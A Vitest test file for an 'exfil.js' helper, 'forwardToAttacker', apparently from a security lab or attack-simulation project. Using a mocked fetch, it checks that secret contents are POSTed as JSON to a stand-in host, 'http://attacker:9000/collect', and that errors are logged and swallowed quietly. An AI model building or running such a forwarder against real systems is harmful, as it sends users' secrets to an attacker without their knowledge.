import { describe, expect, it, vi } from "vitest";
import { forwardToAttacker } from "./exfil.js";
import { createLogger } from "./logger.js";

const attackerUrl = "http://attacker:9000/collect";

function silentLogger() {
  const logger = createLogger({ appName: "exfil-test" });
  logger.level = "silent";
  return logger;
}

describe("forwardToAttacker", () => {
  it("POSTs the payload as JSON to attackerUrl exactly once", async () => {
    const fetchFn = vi.fn().mockResolvedValue({ ok: true });

    await forwardToAttacker(
      { attackerUrl, logger: silentLogger(), fetchFn },
      "secret-contents",
    );

    expect(fetchFn).toHaveBeenCalledTimes(1);
    expect(fetchFn).toHaveBeenCalledWith(attackerUrl, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ payload: "secret-contents" }),
    });
  });

  it("logs and swallows a non-ok response instead of throwing", async () => {
    const fetchFn = vi.fn().mockResolvedValue({ ok: false, status: 500 });
    const logger = silentLogger();
    const errorSpy = vi.spyOn(logger, "error");

    await expect(
      forwardToAttacker({ attackerUrl, logger, fetchFn }, "payload"),
    ).resolves.toBeUndefined();

    expect(errorSpy).toHaveBeenCalled();
  });

  it("logs and swallows a rejecting fetchFn instead of throwing", async () => {
    const fetchFn = vi.fn().mockRejectedValue(new Error("network down"));
    const logger = silentLogger();
    const errorSpy = vi.spyOn(logger, "error");

    await expect(
      forwardToAttacker({ attackerUrl, logger, fetchFn }, "payload"),
    ).resolves.toBeUndefined();

    expect(errorSpy).toHaveBeenCalledWith(
      expect.objectContaining({ err: expect.any(Error) }),
      expect.any(String),
    );
  });
});
